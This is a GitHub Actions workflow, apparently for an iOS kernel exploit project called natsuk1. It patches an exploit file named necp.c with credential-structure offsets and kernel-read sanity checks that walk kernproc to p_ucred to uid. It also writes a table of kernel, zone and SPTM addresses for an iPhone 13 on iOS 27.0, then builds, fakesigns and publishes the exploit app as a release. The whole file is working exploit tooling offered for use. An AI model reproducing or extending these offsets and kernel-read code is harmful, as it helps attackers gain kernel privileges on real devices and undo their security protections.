name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Patch necp.c
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import re, sys

          p = "natsuk1/Exploit/necp.c"
          s = open(p).read()
          orig = s

          s = re.sub(r"#define\s+UCRED_UID_OFF\s+0x[0-9A-Fa-f]+",
                     "#define UCRED_UID_OFF           0x8",  s)
          s = re.sub(r"#define\s+UCRED_SVUID_OFF\s+0x[0-9A-Fa-f]+",
                     "#define UCRED_SVUID_OFF         0xC",  s)
          s = re.sub(r"#define\s+UCRED_GID_OFF\s+0x[0-9A-Fa-f]+",
                     "#define UCRED_GID_OFF           0x14", s)
          s = re.sub(r"#define\s+UCRED_SVGID_OFF\s+0x[0-9A-Fa-f]+",
                     "#define UCRED_SVGID_OFF         0x18", s)

          s = re.sub(r"#define\s+PROC_RO_P_UCRED_OFF\s+0x[0-9A-Fa-f]+",
                     "#define PROC_RO_P_UCRED_OFF     0x98", s)

          s = s.replace("OFF_ALLPROC", "OFF_KERNPROC")
          s = re.sub(r"#define\s+OFF_KERNPROC\s+0xBBB048ULL\s*\n", "", s)

          s = re.sub(
              r"static const uint64_t known_offs\[\]\s*=\s*\{[^}]*\};",
              "static const uint64_t known_offs[] = { 0xBBB040, 0x10D53F0 };",
              s)
          s = re.sub(r"for \(int i = 0; i < 6; i\+\+\)",
                     "for (int i = 0; i < 2; i++)", s)

          new_sanity = '''static int sanity_check(void) {
    log_info("SANITY", "reading verified anchors via kread...");
    uint64_t kernproc  = kread64(g_kbase + OFF_KERNPROC);
    uint64_t task_list = kread64(g_kbase + OFF_TASK_LIST);
    log_info("SANITY", "kernproc  = 0x%llx", (unsigned long long)kernproc);
    log_info("SANITY", "task_list = 0x%llx", (unsigned long long)task_list);
    int ok = 0;
    if (kernproc  >= KPTR_MIN && kernproc  <= KPTR_MAX) ok++;
    if (task_list >= KPTR_MIN && task_list <= KPTR_MAX) ok++;
    log_info("SANITY", "%d/2 anchors valid", ok);
    return ok == 2 ? 0 : -1;
}'''
          s = re.sub(r"static int sanity_check\(void\) \{.*?\n\}",
                     new_sanity, s, count=1, flags=re.DOTALL)

          new_task = '''static int task_sanity(void) {
    uint64_t kernproc = kread64(g_kbase + OFF_KERNPROC);
    if (!kernproc || kernproc < KPTR_MIN || kernproc > KPTR_MAX) {
        log_err("TASK", "kernproc invalid: 0x%llx", (unsigned long long)kernproc);
        return -1;
    }
    uint32_t pid = kread32(kernproc + PROC_PID_OFF);
    log_info("TASK", "kernproc->p_pid=%u (expect 0)", pid);

    uint64_t ucred = kread64(kernproc + PROC_RO_P_UCRED_OFF);
    log_info("TASK", "kernproc->p_ucred@0x%x = 0x%llx",
             PROC_RO_P_UCRED_OFF, (unsigned long long)ucred);
    if (ucred < KPTR_MIN || ucred > KPTR_MAX) {
        log_warn("TASK", "ucred invalid, trying fallback p_ucred@0xB8");
        ucred = kread64(kernproc + 0xB8);
        log_info("TASK", "fallback p_ucred=0x%llx", (unsigned long long)ucred);
    }
    if (ucred >= KPTR_MIN && ucred <= KPTR_MAX) {
        uint32_t uid = kread32(ucred + UCRED_UID_OFF);
        log_info("TASK", "kernproc ucred uid=%u (expect 0)", uid);
        if (pid == 0 && uid == 0) {
            log_ok("TASK", "kernproc -> p_ucred -> uid chain works");
            return 0;
        }
    }
    log_warn("TASK", "chain broken");
    return -1;
}'''
          s = re.sub(r"static int task_sanity\(void\) \{.*?\n\}",
                     new_task, s, count=1, flags=re.DOTALL)

          s = s.replace("=== natsuk1 v1.1 ===", "=== natsuk1 v1.2 (krw-fix) ===")

          if s == orig:
              print("!! WARNING: necp.c unchanged")
              sys.exit(1)

          open(p, "w").write(s)
          print("necp.c patched OK")
          PY

      - name: Write full offsets JSON
        run: |
          mkdir -p natsuk1/Offsets
          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'JSON'
          {
            "groups": [
              { "title": "Kernel",     "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
              { "title": "Globals",    "items": ["off_g_kernproc","off_g_kernel_task","off_g_zone_map","off_g_task_list","off_g_kernel_map","off_g_allproc"] },
              { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext"] },
              { "title": "proc",       "items": ["off_proc_p_pid","off_proc_ro_p_ucred"] },
              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_thread_task_threads_next"] },
              { "title": "NECP",       "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow"] },
              { "title": "Zones",      "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
              { "title": "SPTM",       "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
            ],
            "defaults": {
              "off_kernel_base": "0xFFFFFFF007004000",
              "off_sysent_base": "0x0",
              "off_sysent_count": "558",
              "off_sysent_stride": "24",
              "off_mach_trap_table": "0xFFFFFFF007BE8018",
              "off_g_kernproc": "0xFFFFFFF007BBF040",
              "off_g_kernel_task": "0x0",
              "off_g_zone_map": "0x0",
              "off_g_task_list": "0xFFFFFFF0080D93F0",
              "off_g_kernel_map": "0x0",
              "off_g_allproc": "0x0",
              "off_fn_copyin": "0xFFFFFFF00A7B9570",
              "off_fn_copyout": "0xFFFFFFF00A2C6C28",
              "off_fn_kalloc_ext": "0xFFFFFFF00A200DCC",
              "off_fn_kfree_ext": "0xFFFFFFF00A201000",
              "off_proc_p_pid": "0x74",
              "off_proc_ro_p_ucred": "0x98",
              "off_task_map": "0x28",
              "off_task_bsd_info": "0x3A0",
              "off_task_itk_space": "0x320",
              "off_thread_task_threads_next": "0x50",
              "off_necp_open": "0xFFFFFFF00A4E411C",
              "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
              "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
              "off_zone_data_kalloc": "0xFFFFFFF007C62E70",
              "off_zone_early_kalloc": "0xFFFFFFF007BBB170",
              "off_zone_kalloc_type_var": "0xFFFFFFF007BC2800",
              "off_zone_site_struct_task": "0xFFFFFFF007C64080",
              "off_zone_site_struct_proc": "0xFFFFFFF007C71240",
              "off_zone_site_struct_thread": "0xFFFFFFF007C63D00",
              "off_zone_site_struct_ucred": "0xFFFFFFF007C6F140",
              "off_zone_site_struct_ipc_port": "0xFFFFFFF007C79248",
              "off_zone_site_struct_ipc_entry": "0xFFFFFFF007C79298",
              "off_zone_site_struct_fileproc": "0xFFFFFFF007C7CD08",
              "off_zone_site_struct_fileglob": "0xFFFFFFF007C7D708",
              "off_zone_site_struct_vnode": "0xFFFFFFF007C660C0",
              "off_zone_site_struct_mount": "0xFFFFFFF007C662C0",
              "off_zone_site_struct_socket": "0xFFFFFFF007C70C40",
              "off_zone_site_struct_inpcb": "0xFFFFFFF007C6D180",
              "off_zone_site_struct_pipe": "0xFFFFFFF007C6FE80",
              "off_zone_site_struct_vm_page": "0xFFFFFFF007C64C80",
              "off_sptm_base": "0xFFFFFFF027004000",
              "off_sptm_ctrr_lock_boot": "0xFFFFFFF027006E62",
              "off_sptm_cpu_lock_system_registers": "0xFFFFFFF0270B39B4",
              "off_sptm_determine_kernel_ctrr": "0xFFFFFFF0270B2224",
              "off_sptm_bootstrap": "0xFFFFFFF0270D21CC",
              "off_sptm_map": "0xFFFFFFF0270E97BC",
              "off_sptm_region": "0xFFFFFFF0270ECFF0",
              "off_sptm_panic": "0xFFFFFFF0270BEE18",
              "off_sptm_page_table": "0xFFFFFFF0270D13D4"
            }
          }
          JSON

      - name: Write offsets index
        run: |
          cat > natsuk1/Offsets/index.json <<'JSON'
          {
            "versions": [
              {
                "file": "iPhone14,5_iOS27.0_24A437.json",
                "device": "iPhone14,5",
                "deviceName": "iPhone 13",
                "chip": "A15 Bionic",
                "ios": "27.0",
                "build": "24A437",
                "verified": false
              }
            ]
          }
          JSON

      - name: Verify
        run: |
          set -euo pipefail
          F=natsuk1/Exploit/necp.c
          ! grep -q "OFF_ALLPROC" "$F"
          grep -q "PROC_RO_P_UCRED_OFF     0x98" "$F"
          grep -q "UCRED_UID_OFF           0x8"   "$F"
          grep -q "known_offs\[\] = { 0xBBB040, 0x10D53F0 }" "$F"
          grep -q "verified anchors via kread" "$F"
          python3 - <<'PY'
          import json
          f = "natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
          data = json.load(open(f))
          items = sum(len(g["items"]) for g in data["groups"])
          assert items == len(data["defaults"])
          assert data["defaults"]["off_proc_ro_p_ucred"] == "0x98"
          assert data["defaults"]["off_g_kernproc"] == "0xFFFFFFF007BBF040"
          print(f"OK: {items} offsets")
          PY

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "kread fix iOS 27.0/24A437"

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Exploit/necp.c natsuk1/Offsets/ .github/workflows/fix_and_test.yml
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "Fix kernel-read for iOS 27.0/24A437 [skip ci]"
          git push
